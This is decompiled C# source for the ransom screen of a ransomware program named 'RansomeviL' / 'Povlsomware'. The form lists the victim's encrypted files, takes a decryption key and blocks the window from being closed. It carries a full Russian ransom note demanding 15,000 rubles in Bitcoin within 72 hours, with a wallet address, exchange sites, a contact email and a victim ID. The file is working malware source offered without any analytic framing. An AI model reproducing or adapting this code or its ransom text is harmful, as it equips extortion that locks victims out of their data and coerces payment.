using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Povlsomware;

public class PayM3 : Form
{
	private bool success = false;

	private IContainer components = null;

	private TextBox textBox1;

	private Button button1;

	private Label label1;

	private Label label2;

	private ListBox listBox1;

	private Label label3;

	private BackgroundWorker backgroundWorker1;

	private ListBox listBox3;

	public PayM3()
	{
		InitializeComponent();
		((Control)label2).set_Text(Program.count + " зашифрованныо файлов ");
		ObjectCollection items = listBox1.get_Items();
		object[] array = Program.encryptedFiles.ToArray();
		items.AddRange(array);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		string text = ((Control)textBox1).get_Text();
		if (text == Program.GetPass())
		{
			success = true;
			((Control)button1).set_Text("Процесс запущен ждите");
			backgroundWorker1.RunWorkerAsync(text);
		}
		else
		{
			((Control)textBox1).set_Text(string.Empty);
			((ContainerControl)this).set_ActiveControl((Control)(object)textBox1);
			((Control)button1).set_Text("Неверный ключ :( ");
		}
	}

	private void Screen_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!success)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void PayM3_Load(object sender, EventArgs e)
	{
		((Control)this).Show();
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		string decryption_password = e.Argument as string;
		Program.UndoAttack(decryption_password);
	}

	private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Application.Exit();
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void label3_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void listBox2_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void listBox3_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_026f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0279: Expected O, but got Unknown
		//IL_02a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0326: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_0460: Unknown result type (might be due to invalid IL or missing references)
		//IL_046a: Expected O, but got Unknown
		//IL_0660: Unknown result type (might be due to invalid IL or missing references)
		//IL_077d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0787: Expected O, but got Unknown
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e1: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(PayM3));
		textBox1 = new TextBox();
		button1 = new Button();
		label1 = new Label();
		label2 = new Label();
		listBox1 = new ListBox();
		label3 = new Label();
		backgroundWorker1 = new BackgroundWorker();
		listBox3 = new ListBox();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 10f));
		((Control)textBox1).set_Location(new Point(42, 365));
		((Control)textBox1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(209, 23));
		((Control)textBox1).set_TabIndex(0);
		((Control)button1).set_BackColor(SystemColors.InactiveCaption);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)button1).set_Location(new Point(42, 393));
		((Control)button1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(208, 47));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Расшифровать данные");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)Button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1));
		((Control)label1).set_ForeColor(SystemColors.ButtonFace);
		((Control)label1).set_Location(new Point(10, 9));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(227, 20));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text(" Зашифрованные фаилы!");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.ButtonFace);
		((Control)label2).set_Location(new Point(20, 38));
		((Control)label2).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(41, 13));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("label2");
		((ListControl)listBox1).set_FormattingEnabled(true);
		listBox1.set_HorizontalScrollbar(true);
		((Control)listBox1).set_Location(new Point(1, 69));
		((Control)listBox1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(293, 277));
		((Control)listBox1).set_TabIndex(4);
		listBox1.add_SelectedIndexChanged((EventHandler)listBox1_SelectedIndexChanged);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(SystemColors.ButtonFace);
		((Control)label3).set_Location(new Point(39, 349));
		((Control)label3).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(74, 13));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Ввести ключ:");
		((Control)label3).add_Click((EventHandler)label3_Click);
		backgroundWorker1.DoWork += backgroundWorker1_DoWork;
		backgroundWorker1.RunWorkerCompleted += backgroundWorker1_RunWorkerCompleted;
		((Control)listBox3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((ListControl)listBox3).set_FormattingEnabled(true);
		listBox3.set_HorizontalScrollbar(true);
		listBox3.get_Items().AddRange(new object[48]
		{
			"К сожалению, все ваши данные зашифрованны.", "  1.Что случилось с моими фаилами??? ", "Ваши личные файлы, включая ваши фотографии, документы и другие важные ", "файлы на этом компьютере, зашифрованны с помощью RSA-2048. ", "Алгоритм RSA генерирует открытый и закрытый ключи персонально для вашего компьютера.", "Открытый ключ был использован для шифрования ваших фаилов минуту назад.", "Закрытый ключ, котрый необходим вам для расшифровки и востановления ваших", "фаилов, отправлен на наш сервер.", "   2.Как расшифровать мои фаилы???", "Чтобы расшифровать ваши данные, вы должны заплатить 15000руб.",
			"за  ключ  дешифровки. Обратите внимание, что у вас есть ТОЛЬКО 72 ЧАСА для ", "совершения платежа. Если ваш платёж не поступит в указанный срок, ваш закрытый", "ключ будет автоматически удалён c нашего сервера.", "В этом случае ваши фаилы будут навсегда утерянны! ", "Кроме того, рекомендуем вам не тратить своё время зря, потому что иного способа", "востановления фаилов, кроме внесения оплаты, попросту не существует.", "    3.Как мне оплатить ключ???", "Для обеспечения безопасности транзакции все платежи принимаются в Btcoin.", "Вам нужно пополнить следующий Биткоин кошелёк:", "                 ",
			"                         bc1qpjungp7kgqlp22np0n4d4cp5y9je7cgcrdldvr", "", "Вы можете произвести оплату биткоином при помощи собственного биткоин-кошелька или ", "воспользоваться услугами обменника, можете выбрать более удобный для вас способ.", "Наиболее простым для вас способом будет воспользоваться обменником, рекомендуем ", "следующие обменники:  ", "             60cek.org", "             baksman.org", "Так же можете выбрать обменник сами по этому адресу:", "              www.bestchange.ru  ",
			"На сайте выбранного обменнинка, в поле \"Отдаёте\" выберите удобную для вас платёжную систему,", "В поле \"Получаете\" выбрать bitcoin.", "Введите 15000 в поле \"Сумма\", сумма биткоина будет рассчитана автоматически ", "далее заполните появившиеся поля,  в текстовое поле\"Кошелёк получателя\" ", "ведите адрес нашего кошелька. Далее завершите платёж. ", "   4.Как мне получить ключ???", "Вам нужно отправить на почту revilsapport@mail.ru ваш персональный индификатор, ", "он понадобится нам, чтобы понять от кого поступил платёж.", "По факту поступления средств на указанный нами биткоин адрес вам на почту в течении", "одного робочего дня будут высланны ключ дешифровки и инструкции, по востановлению",
			"ваших данных. ", "После их выполнения всё ваши фаилы будут востановлены.", "", "Ваш персональный индификатор: YenYeBTpde", "", "Если у вас возникли какие-либо проблемы, пожалуйста, не стесняйтесь обращаться к нам ", "по электронной почте.", "С уважением, команда EvilCrypt."
		});
		((Control)listBox3).set_Location(new Point(299, 8));
		((Control)listBox3).set_Margin(new Padding(2, 3, 2, 3));
		((Control)listBox3).set_Name("listBox3");
		((Control)listBox3).set_Size(new Size(556, 420));
		((Control)listBox3).set_TabIndex(7);
		listBox3.add_SelectedIndexChanged((EventHandler)listBox3_SelectedIndexChanged);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(859, 441));
		((Control)this).get_Controls().Add((Control)(object)listBox3);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(2, 3, 2, 3));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("PayM3");
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("RansomeviL 1.3.2");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Screen_FormClosing));
		((Form)this).add_Load((EventHandler)PayM3_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
